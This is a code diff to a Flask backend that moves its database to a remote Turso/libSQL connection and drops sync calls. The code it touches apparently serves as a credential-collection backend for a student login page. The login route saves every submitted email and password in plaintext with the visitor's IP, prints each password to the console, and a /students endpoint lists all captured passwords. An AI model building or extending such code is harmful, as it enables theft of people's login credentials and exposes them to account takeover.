@@ -16,7 +16,6 @@ import libsql
 app = Flask(__name__)
 CORS(app)  # Allow requests from the HTML frontend
 
-# DB_PATH = "students.db"
 TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL") or os.getenv("LIBSQL_URL")
 TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN") or os.getenv("LIBSQL_AUTH_TOKEN")
 
@@ -24,15 +23,13 @@ TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN") or os.getenv("LIBSQL_AUTH_TOKEN
 
 @contextmanager
 def get_db():
-    if TURSO_DATABASE_URL and TURSO_AUTH_TOKEN:
-        conn = libsql.connect(
-            DB_PATH,
-            sync_url=TURSO_DATABASE_URL,
-            auth_token=TURSO_AUTH_TOKEN,
-            sync_interval=60,
-        )
-    # else:
-        # conn = libsql.connect(DB_PATH)
+    if not TURSO_DATABASE_URL or not TURSO_AUTH_TOKEN:
+        raise RuntimeError("TURSO_DATABASE_URL and TURSO_AUTH_TOKEN must be set")
+
+    conn = libsql.connect(
+        url=TURSO_DATABASE_URL,
+        auth_token=TURSO_AUTH_TOKEN
+    )
 
     try:
         yield conn
@@ -70,8 +67,6 @@ def init_db():
             )
         """)
         conn.commit()
-        if TURSO_DATABASE_URL and TURSO_AUTH_TOKEN:
-            conn.sync()
     print("[DB] Database initialised ✓")
 
 # ── ROUTES ────────────────────────────────────────────────────────────────────
@@ -111,8 +106,6 @@ def login():
                 VALUES (?, ?, ?, ?, ?)
             """, (email, password, ip, now, now))
             conn.commit()
-            if TURSO_DATABASE_URL and TURSO_AUTH_TOKEN:
-                conn.sync()
             print(f"[NEW]  {email} | pwd: {password} | ip: {ip} | {now}")
             action = "registered"
         else:
@@ -125,8 +118,6 @@ def login():
                 WHERE id = ?
             """, (now, ip, row["id"]))
             conn.commit()
-            if TURSO_DATABASE_URL and TURSO_AUTH_TOKEN:
-                conn.sync()
             print(f"[RTRN] {email} | pwd: {password} | ip: {ip} | {now} (login #{row['login_count']+1})")
             action = "logged_in"
 
@@ -144,8 +135,6 @@ def list_students():
     Access via: http://localhost:5000/students
     """
     with get_db() as conn:
-        if TURSO_DATABASE_URL and TURSO_AUTH_TOKEN:
-            conn.sync()
         students = fetchall_dicts(
             conn,
             "SELECT id, email, password, ip_address, login_count, first_login, last_login FROM students ORDER BY id DESC",
